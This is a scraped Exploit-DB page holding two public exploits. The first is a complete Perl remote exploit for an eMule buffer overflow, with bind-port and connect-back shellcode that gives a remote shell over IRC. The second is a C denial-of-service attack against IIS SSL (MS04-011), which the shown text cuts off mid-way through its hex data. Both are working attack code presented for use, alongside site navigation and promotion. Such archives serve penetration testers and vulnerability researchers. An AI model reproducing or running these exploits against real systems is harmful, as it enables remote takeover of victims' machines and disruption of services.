pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDeMule 0.42d - IRC Remote Buffer OverflowEDB-ID:175CVE:2004-1892EDB Verified:Author:kingcopeType:remoteExploit:/Platform:WindowsDate:2004-04-12Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl## eMule <= 0.42d Remote Exploit by kcope## exploits the DecodeBase16 buffer overflow# tested on WinXP SP1 / Win2k SP4# bindport/connectback shellcode## thanks Kostya Kortchinsky for his posting to bugtraq## greetings to sander, blackzero, beginna, adize, A-cru and wY :p# have fun!## kcope, kingcope gmx net Apr 2004#use Socket;use Getopt::Std;# bindport shellcode (port 2004) thanks to metasploit$sc = "\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\x21\x39"."\x11\x09\x83\xeb\xfc\xe2\xf4\xc9\x6f\x11\x09\x21\x6a\x44\x5f\x76"."\xb2\x7d\x2d\x39\xb2\x54\x35\xaa\x6d\x14\x71\x20\xd3\x9a\x43\x39"."\xb2\x4b\x29\x20\xd2\xf2\x3b\x68\xb2\x25\x82\x20\xd7\x20\xf6\xdd"."\x08\xd1\xa5\x19\xd9\x65\x0e\xe0\xf6\x1c\x08\xe6\xd2\xe3\x32\x5d"."\x1d\x05\x7c\xc0\xb2\x4b\x2d\x20\xd2\x77\x82\x2d\x72\x9a\x53\x3d"."\x38\xfa\x82\x25\xb2\x10\xe1\xca\x3b\x20\xc9\x7e\x67\x4c\x52\xe3"."\x31\x11\x57\x4b\x09\x48\x6d\xaa\x20\x9a\x52\x2d\xb2\x4a\x15\xaa"."\x22\x9a\x52\x29\x6a\x79\x87\x6f\x37\xfd\xf6\xf7\xb0\xd6\x88\xcd"."\x39\x10\x09\x21\x6e\x47\x5a\xa8\xdc\xf9\x2e\x21\x39\x11\x99\x20"."\x39\x11\xbf\x38\x21\xf6\xad\x38\x49\xf8\xec\x68\xbf\x58\xad\x3b"."\x49\xd6\xad\x8c\x17\xf8\xd0\x28\xcc\xbc\xc2\xcc\xc5\x2a\x5e\x72"."\x0b\x4e\x3a\x13\x39\x4a\x84\x6a\x19\x40\xf6\xf6\xb0\xce\x80\xe2"."\xb4\x64\x1d\x4b\x3e\x48\x58\x72\xc6\x25\x86\xde\x6c\x15\x50\xa8"."\x3d\x9f\xeb\xd3\x12\x36\x5d\xde\x0e\xee\x5c\x11\x08\xd1\x59\x71"."\x69\x41\x49\x71\x79\x41\xf6\x74\x15\x98\xce\x10\xe2\x42\x5a\x49"."\x3b\x11\x0e\xf5\xb0\xf1\x63\x31\x69\x46\xf6\x74\x1d\x42\x5e\xde"."\x6c\x39\x5a\x75\x6e\xee\x5c\x01\xb0\xd6\x61\x62\x74\x55\x09\xa8"."\xda\x96\xf3\x10\xf9\x9c\x75\x05\x95\x7b\x1c\x78\xca\xba\x8e\xdb"."\xba\xfd\x5d\xe7\x7d\x35\x19\x65\x5f\xd6\x4d\x05\x05\x10\x08\xa8"."\x45\x35\x41\xa8\x45\x35\x45\xa8\x45\x35\x59\xac\x7d\x35\x19\x75"."\x69\x40\x58\x70\x78\x40\x40\x70\x68\x42\x58\xde\x4c\x11\x61\x53"."\xc7\xa2\x1f\xde\x6c\x15\xf6\xf1\xb0\xf7\xf6\x54\x39\x79\xa4\xf8"."\x3c\xdf\xf6\x74\x3d\x98\xca\x4b\xc6\xee\x3f\xde\xea\xee\x7c\x21"."\x51\x6f\xd1\xc3\x4a\xee\x5c\x25\x08\xca\x5a\xde\xe9\x11\x09";# connect back shellcode by lion, xor 0x21$cbsc ="\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x21\xE2\xFA"."\xEB\x05\xE8\xEB\xFF\xFF\xFF"."\xC8\xDA\x21\x21\x21\x7E\x45\x80\x11\x21\x21\x21\xAA\x61\x2D\xAA"."\x51\x3D\x8C\xAA\x49\x29\xAA\xD6\x4B\x25\x78\xC9\xBA\x21\x21\x21"."\xC3\xD8\x49\x12\x13\x21\x21\x49\x56\x52\x13\x7E\x75\xDE\x37\xAA"."\xC9\x4B\x25\x78\xC9\xA3\x21\x21\x21\xC3\xD8\xA0\xCD\xB1\x20\x21"."\x21\x75\x49\x20\x20\x21\x21\xDE\x77\x31\x71\x71\x71\x71\x61\x71"."\x61\x71\xDE\x77\x35\xAA\xF9\x49\x5E\x21\x21\x20\x49\x23\x21\x21"."\x14\xAA\xED\x4B\x31\x70\x72\xDE\x77\x39\xA4\xE1\x54\x6B\x49\x42"."\x4C\x45\x21\xA8\x47\x11\xA2\xCD\x75\xAC\x1D\x05\x4B\x34\x78\x8A"."\xC3\xDC\xE7\x65\x05\x31\x65\xDF\x65\x05\x1C\xA8\x7D\x05\x69\xA8"."\x7D\x05\x6D\xA8\x7D\x05\x71\xAC\x65\x05\x31\x75\x71\x70\x70\x70"."\x4B\x20\x70\x70\xDE\x57\x11\x70\xDE\x77\x25\xAA\xED\x4B\xDE\xDE"."\x10\xDE\x77\x29\x72\xDE\x77\x3D\xDE\x77\x2D\x70\x77\xAA\x64\x1D"."\xAA\x75\x09\x59\x22\xF4\x73\xAA\x53\x01\x22\xD4\x12\xE8\x68\x60"."\x8C\x22\xE4\x12\xFA\x2E\x9F\x31\x1B\xF7\x55\x29\xE0\xEA\x2C\x22"."\xFB\x61\xCA\xD0\x1A\x3E\x54\xC6\x7B\xAA\x7B\x05\x22\xFC\x47\xAA"."\x2D\x6A\xAA\x7B\x3D\x22\xFC\xAA\x25\xAA\x22\xE4\x8A\x7F\x78\xE2"."\xC9\x21\xDE\xDE\xDE\xAF\x6F\x2F\xCD\x53\xDF\x92\x37\x8C\xF8\x24"."\xEF\x5F\xF9\xC3\x52\xEA\xCC\xDD\x1A\xF8\x28\xD4\x8C\xCD\xD8\x8B"."\x41\xC6\x58\xE7\x58";# find shellcode in memory$find_sc = "648B3D08000000BA0100000042424264"."8B1A8BCB2BCFB0D9909090FCF2AE803F"."EE9075F8807F01D975F2BA0100000042"."803C3A7475E64FFFE79090";$find_sccb = "648B3D08000000BA0100000042424264"."8B1A8BCB2BCFB0EB909090FCF2AE803F"."109075F8807F015B75F2BA0100000042"."803C3A4B75E64FFFE79090";$numtargets = 4;@targets =(["eMule 0.42d", "7af65700", 76],["eMule 0.42c", "514c5f00", 76],["eMule 0.42b (Hotfix)", "d12e5f00", 76],["eMule 0.42a", "012f5f00", 76]# ["eMule 0.30e", "acf65b00", 20]);$exploiting_nick = "eMuleIRC3713"; # change this nickname if neededsub connecttoserver(){$bool = "yes";$iaddr = inet_aton($ircserver) || die("Failed to find host: $ircserver");$paddr = sockaddr_in($ircport, $iaddr);$proto = getprotobyname('tcp');socket(SOCK1, PF_INET, SOCK_STREAM, $proto) || die("Failed to open socket:$!");connect(SOCK1, $paddr) || {$bool = "no"};}sub usage() {print "usage: emule4x.pl -n <nick> -s <server> <-t type> [-p port] [-c <ip:port>]\r\n"."use -c switch for reverse shell\r\n"."example: perl emule4x.pl -n emuleuser -s irc.somenet.com -t 0\r\n\r\ntarget types:\r\n";for ($i=0; $i<$numtargets; $i++) {print "\t[".$i."]...". $targets[$i][0]. "\r\n";}exit;}$| = 1;print "\r\n----------------------------------------------------------------------\r\n";print "eMule <= 0.42d Remote Exploit by kcope . kingcope[at]gmx.net\r\n\r";print "Tested on Win2k SP4/WinXP SP1\r\n";print "----------------------------------------------------------------------\r\nLets have fun!\r\n\r\n";if (@ARGV < 4) {usage();}%options=();getopt("scnpt",\%options);$nickname = $options{n};$ircserver = $options{s};$type = $options{t};if (!defined $targets[$type][0]) {print "Invalid target type.\r\n";exit;}if (!defined $type) {print "Please specify a target type.\r\n";exit;}if (defined $options{p}) {$ircport = $options{p};} else {$ircport = 6667;}$usecb=-1;if (defined $options{c}) {$usecb=1;$idx = index $options{c},":";$cbip = substr $options{c},0,$idx;$cbport = substr $options{c},$idx+1;}print "Target type set to ".$targets[$type][0].".\r\n";$ret = $targets[$type][1];$nops1 = "90" x $targets[$type][2];$nops2 = "90" x 40; # customize if neededif ($usecb eq 1) {($a1, $a2, $a3, $a4) = split(//, gethostbyname("$cbip"));$a1 = chr(ord($a1) ^ 0x21);$a2 = chr(ord($a2) ^ 0x21);$a3 = chr(ord($a3) ^ 0x21);$a4 = chr(ord($a4) ^ 0x21);substr($cbsc, 111, 4, $a1 . $a2 . $a3 . $a4);($p1, $p2) = split(//, reverse(pack("s", $cbport)));$p1 = chr(ord($p1) ^ 0x21);$p2 = chr(ord($p2) ^ 0x21);substr($cbsc, 118, 2, $p1 . $p2);print "Using connect back method on $cbip port $cbport.\r\n";}print "Connecting to $ircserver on port $ircport...";connecttoserver();if ($bool eq "no"){print "Connection refused.\r\n";exit(0);}send(SOCK1,"NICK $exploiting_nick\r\n",0);send(SOCK1,"USER $exploiting_nick \"yahoo.com\" \"eu.dal.net\" :$exploiting_nick\r\n",0);while (<SOCK1>) {$line = $_;# print $line;if ((index $line, " 376 ") ne -1) {goto logged_in;}if ((index $line, "PING") ne -1) {substr($line,1,1,"O");send(SOCK1, $line, 0);}}logged_in:print " ok\r\n";sleep(4);print "Sending buffers to $nickname...";# 005f4c51 eMule 0.42c (514c5f00)# 0057f67a eMule 0.42d (7AF65700)if ($usecb eq 1) {send(SOCK1, "PRIVMSG $nickname :$cbsc\r\n", 0);send(SOCK1, "PRIVMSG $nickname :\x01SENDLINK\|" . $nops1 . "EB079090". $ret ."906681EC4000". $nops2 . $find_sccb ."\|\x01\r\n", 0);} else {send(SOCK1, "PRIVMSG $nickname :$sc\r\n", 0);send(SOCK1, "PRIVMSG $nickname :\x01SENDLINK\|" . $nops1 . "EB079090". $ret ."906681EC4000". $nops2 . $find_sc ."\|\x01\r\n", 0);}if ($usecb ne 1) {print "\r\nNow try connecting to ".$nickname."'s ip on port 2004.\r\n";} else {print "\r\nWatch at your netcat for some shell.\r\n";}$recv = <SOCK1>;$recv = <SOCK1>;$recv = <SOCK1>;$recv = <SOCK1>;$recv = <SOCK1>;$recv = <SOCK1>;$recv = <SOCK1>;$recv = <SOCK1>;$recv = <SOCK1>;print " done\r\n";# EOF# milw0rm.com [2004-04-12]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 176
Microsoft IIS - SSL Remote Denial of Service (MS04-011) - Windows dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft IIS - SSL Remote Denial of Service (MS04-011)EDB-ID:176CVE:2004-0120EDB Verified:Author:David BarrosoType:dosExploit:/Platform:WindowsDate:2004-04-14Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** Microsoft SSL Remote Denial of Service* MS04-011** Tested succesfully against IIS 5.0 with SSL.** David Barroso Berrueta dbarroso s21sec com* Alfredo Andres Omella aandres s21sec com** S21sec - www s21sec com*/#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <netdb.h>#include <sys/types.h>#include <sys/socket.h>#include <netinet/in.h>#include <arpa/inet.h>#include <ctype.h>#include <string.h>#include <arpa/nameser.h>#include <errno.h>int exist_host( char *, u_long *);void init_hello(void);/* begin cipher suites: */char cipher_suites[] = /* 52 */{0x00,0x39,0x00,0x38,0x00,0x35,0x00,0x16,0x00,0x13,0x00,0x0A,0x00,0x33,0x00,0x32,0x00,0x2F,0x00,0x66,0x00,0x05,0x00,0x04,0x00,0x63,0x00,0x62,0x00,0x61,0x00,0x15,0x00,0x12,0x00,0x09,0x00,0x65,0x00,0x64,0x00,0x60,0x00,0x14,0x00,0x11,0x00,0x08,0x00,0x06,0x00,0x03};/* begin binary data: */char bin_data[] = /* 1308 */{0x16,0x03,0x00,0x03,0xB8,0x01,0x00,0x03,0xB4,0x00,0x03,0xB1,0x00,0x03,0xAE,0x30,0x82,0x03,0xAA,0x30,0x82,0x03,0x13,0xA0,0x03,0x02,0x01,0x02,0x02,0x01,0x00,0x30,0x0D,0x06,0x09,0x2A,0x86,0x48,0x86,0xF7,0x0D,0x01,0x01,0x04,0x05,0x00,0x30,0x81,0x9B,0x31,0x0B,0x30,0x09,0x06,0x03,0x55,0x04,0x06,0x13,0x02,0x45,0x53,0x31,0x11,0x30,0x0F,0x06,0x03,0x55,0x04,0x08,0x13,0x08,0x50,0x61,0x6C,0x65,0x6E,0x63,0x69,0x61,0x31,0x14,0x30,0x12,0x06,0x03,0x55,0x04,0x07,0x13,0x0B,0x54,0x6F,0x72,0x72,0x65,0x62,0x6C,0x61,0x63,0x6F,0x73,0x31,0x0F,0x30,0x0D,0x06,0x03,0x55,0x04,0x0A,0x13,0x06,0x53,0x32,0x31,0x73,0x65,0x63,0x31,0x19,0x30,0x17,0x06,0x03,0x55,0x04,0x0B,0x13,0x10,0x77,0x77,0x77,0x2E,0x77,0x61,0x73,0x61,0x68,0x65,0x72,0x6F,0x2E,0x6F,0x72,0x67,0x31,0x0F,0x30,0x0D,0x06,0x03,0x55,0x04,0x03,0x13,0x06,0x53,0x32,0x31,0x73,0x65,0x63,0x31,0x26,0x30,0x24,0x06,0x09,0x2A,0x86,0x48,0x86,0xF7,0x0D,0x01,0x09,0x01,0x16,0x17,0x64,0x65,0x76,0x65,0x6C,0x6F,0x70,0x65,0x72,0x73,0x40,0x77,0x61,0x73,0x61,0x68,0x65,0x72,0x6F,0x2E,0x6F,0x72,0x67,0x30,0x1E,0x17,0x0D,0x30,0x34,0x30,0x34,0x31,0x33,0x30,0x38,0x33,0x30,0x35,0x39,0x5A,0x17,0x0D,0x30,0x35,0x30,0x34,0x31,0x33,0x30,0x38,0x33,0x30,0x35,0x39,0x5A,0x30,0x81,0x9B,0x31,0x0B,0x30,0x09,0x06,0x03,0x55,0x04,0x06,0x13,0x02,0x45,0x53,0x31,0x11,0x30,0x0F,0x06,0x03,0x55,0x04,0x08,0x13,0x08,0x50,0x61,0x6C,0x65,0x6E,0x63,0x69,0x61,0x31,0x14,0x30,0x12,0x06,0x03,0x55,0x04,0x07,0x13,0x0B,0x54,0x6F,0x72,0x72,0x65,0x62,0x6C,0x61,0x63,0x6F,0x73,0x31,0x0F,0x30,0x0D,0x06,0x03,0x55,0x04,0x0A,0x13,0x06,0x53,0x32,0x31,0x73,0x65,0x63,0x31,0x19,0x30,0x17,0x06,0x03,0x55,0x04,0x0B,0x13,0x10,0x77,0x77,0x77,0x2E,0x77,0x61,0x73,0x61,0x68,0x65,0x72,0x6F,0x2E,0x6F,0x72,0x67,0x31,0x0F,0x30,0x0D,0x06,0x03,0x55,0x04,0x03,0x13,0x06,0x53,0x32,0x31,0x73,0x65,0x63,0x31,0x26,0x30,0x24,0x06,0x09,0x2A,0x86,0x48,0x86,0xF7,0x0D,0x01,0x09,0x01,0x16,0x17,0x64,0x65,0x76,0x65,0x6C,0x6F,0x70,0x65,0x72,0x73,0x40,0x77,0x61,0x73,0x61,0x68,0x65,0x72,0x6F,0x2E,0x6F,0x72,0x67,0x30,0x81,0x9F,0x30,0x0D,0x06,0x09,0x2A,0x86,0x48,0x86,0xF7,0x0D,0x01,0x01,0x01,0x05,0x00,0x03,0x81,0x8D,0x00,0x30,0x81,0x89,0x02,0x81,0x81,0x00,0xC4,0x76,0x8B,0x8E,0x3A,0x00,0x70,0xD7,0xA0,0x36,0xCF,0xFC,0xE8,0xBF,0x2E,0x18,0x83,0xB0,0xC5,0x7C,0x64,0x2F,0xF7,0xA8,0x31,0x70,0xF4,0xBF,0x31,0x1D,0x81,0x57,0xD7,0x37,0xF9,0xDD,0x7C,0x4E,0xDF,0xB9,0xE2,0xAF,0x69,0x79,0xB3,0xD5,0x59,0x91,0xED,0x27,0xF0,0x44,0x0A,0xC4,0x3C,0x43,0xF9,0xE8,0x03,0xAE,0x10,0xDD,0x8B,0x52,0xC0,0x33,0xD7,0x9D,0x6D,0xE3,0xFF,0x03,0x4B,0x89,0x2F,0x1A,0x73,0xCD,0x11,0x8A,0xD1,0xC1,0x40,0x21,0x2F,0x57,0x22,0x23,0xF5,0x30,0xF8,0x8A,0x0B,0x02,0xDC,0x31,0xB5,0x4C,0xD9,0xCC,0x5A,0x83,0xD8,0x7F,0x0A,0xC1,0x5F,0xA6,0x43,0x6C,0xD4,0xEC,0x9F,0x2F,0xEC,0x9A,0x01,0x63,0x6D,0x30,0x11,0xB9,0xDA,0x73,0x53,0xC2,0x92,0x6B,0x02,0x03,0x01,0x00,0x01,0xA3,0x81,0xFB,0x30,0x81,0xF8,0x30,0x1D,0x06,0x03,0x55,0x1D,0x0E,0x04,0x16,0x04,0x14,0xE9,0x66,0x7B,0x58,0x23,0xA2,0x35,0x0F,0xD4,0x31,0x7C,0xAE,0xC6,0x87,0x64,0x38,0x4E,0xAB,0xAA,0x58,0x30,0x81,0xC8,0x06,0x03,0x55,0x1D,0x23,0x04,0x81,0xC0,0x30,0x81,0xBD,0x80,0x14,0xE9,0x66,0x7B,0x58,0x23,0xA2,0x35,0x0F,0xD4,0x31,0x7C,0xAE,0xC6,0x87,0x64,0x38,0x4E,0xAB,0xAA,0x58,0xA1,0x81,0xA1,0xA4,0x81,0x9E,0x30,0x81,0x9B,0x31,0x0B,0x30,0x09,0x06,0x03,0x55,0x04,0x06,0x13,0x02,0x45,0x53,0x31,0x11,0x30,0x0F,0x06,0x03,0x55,0x04,0x08,0x13,0x08,0x50,0x61,0x6C,0x65,0x6E,0x63,0x69,0x61,0x31,0x14,0x30,0x12,0x06,0x03,0x55,0x04,0x07,0x13,0x0B,0x54,0x6F,0x72,0x72,0x65,0x62,0x6C,0x61,0x63,0x6F,0x73,0x31,0x0F,0x30,0x0D,0x06,0x03,0x55,0x04,0x0A,0x13,0x06,0x53,0x32,0x31,0x73,0x65,0x63,0x31,0x19,0x30,0x17,0x06,0x03,0x55,0x04,0x0B,0x13,0x10,0x77,0x77,0x77,0x2E,0x77,0x61,0x73,0x61,0x68,0x65,0x72,0x6F,0x2E,0x6F,0x72,0x67,0x31,0x0F,0x30,0x0D,0x06,0x03,0x55,0x04,0x03,0x13,0x06,0x53,0x32,0x31,0x73,0x65,0x63,0x31,0x26,0x30,0x24,0x06,0x09,0x2A,0x86,0x48,0x86,0xF7,0x0D,0x01,0x09,0x01,0x16,0x17,0x64,0x65,0x76,0x65,0x6C,0x6F,0x70,0x65,0x72,0x73,0x40,0x77,0x61,0x73,0x61,0x68,0x65,0x72,0x6F,0x2E,0x6F,0x72,0x67,0x82,0x01,0x00,0x30,0x0C,0x06,0x03,0x55,0x1D,0x13,0x04,0x05,0x30,0x03,0x01,0x01,0xFF,0x30,0x0D,0x06,0x09,0x2A,0x86,0x48,0x86,0xF7,0x0D,0x01,0x01,0x04,0x05,0x00,0x03,0x81,0x81,0x00,0x75,0x2D,0x19,0xE1,0xAD,0x19,0x77,0x75,0xCB,0xCB,0x76,0x88,0x38,0xF8,0xD5,0x27,0xD2,0xAB,0x79,0x7F,0x39,0x4A,0x9C,0x56,0x9A,0x5F,0xCA,0x0C,0xAC,0x21,0x16,0xF6,0xF5,0xE2,0xE8,0xE1,0xB9,0xC2,0x29,0x25,0x52,0xAF,0xF1,0x83,0x28,0xB0,0x00,0x7B,0xA6,0x12,0xE6,0xC7,0x4D,0x93,0x0C,0x7E,0xD0,0x83,0x1E,0x59,0x4D,0xEB,0xDF,0xDC,0xED,0x05,0x01,0x84,0xC7,0x92,0x52,0x65,0x26,0xAA,0x08,0x45,0x65,0x5A,0xB6,0x33,0xDC,0x2A,0xBB,0x85,0x26,0x14,0x9C,0xBD,0xED,0xFB,0xBB,0x53,0xB3,0xA4,0xB3,0x27,0xC7,0x25,0x02,0xD4,0x0D,0xAA,0x5E,0x2F,0x53,0xD4,0x1F,0xFB,0xFE,0x07,0x24,0xC6,0x27,0x65,0x59,0x35,0x43,0x7D,0x28,0xD7,0x42,0x11,0x57,0x84,0x17,0x0D,0x99,0x2B,0x16,0x03,0x00,0x00,0x84,0x10,0x00,0x00,0x80,0x2A,0x68,0x9A,0xBC,0x58,0x4D,0xA8,0xDD,0xD3,0x95,0xC0,0xF2,0x70,0x98,0xC8,0xBE,0xE5,0x0C,0x0D,0xC1,0x40,0xD5,0x95,0x17,0xD6,0xBF,0x04,0x2B,0xEB,0x18,0x54,0x2D,0x9F,0x72,0x55,0xCA,0x84,0x26,0xF2,0xAF,0xFA,0x13,0xE2,0x15,0x9A,0x88,0x31,0x92,0xC5,0x1E,0xB7,0xF8,0xD7,0x2D,0x97,0x9A,0x46,0xEF,0x73,0xFF,0xB3,0xA1,0x92,0x0B,0x64,0xC5,0xC8,0xA9,0xBB,0x24,0xE5,0xD2,0x4B,0x49,0x0D,0x1B,0xB1,0x5F,0xE4,0x5E,0x2E,0x60,0x29,0x48,0xB5,0xC2,0x1C,0xA5,0x53,0x7B,0x7B,0x55,0xFD,0x1A,0xAF,0x89,0x0B,0x0B,0xB4,0x91,0x0E,0xE5,0x32,0x90,0xCD,0xB4,0xC5,0xD6,0x30,0x01,0xCD,0x83,0x29,0xDA,0x4D,0xA5,0x51,0x0B,0x95,0xDC,0xF0,0x83,0x3C,0x81,0x18,0x3D,0x90,0x83,0x16,0x03,0x00,0x00,0x86,0x0F,0x00,0x00,0x82,0x00,0x80,0xC0,0x56,0x18,0x55,0x92,0xEF,0x42,0xC2,0x96,0xB5,0x9D,0x81,0x9D,0x3E,0x2A,0x9C,0x60,0x9B,0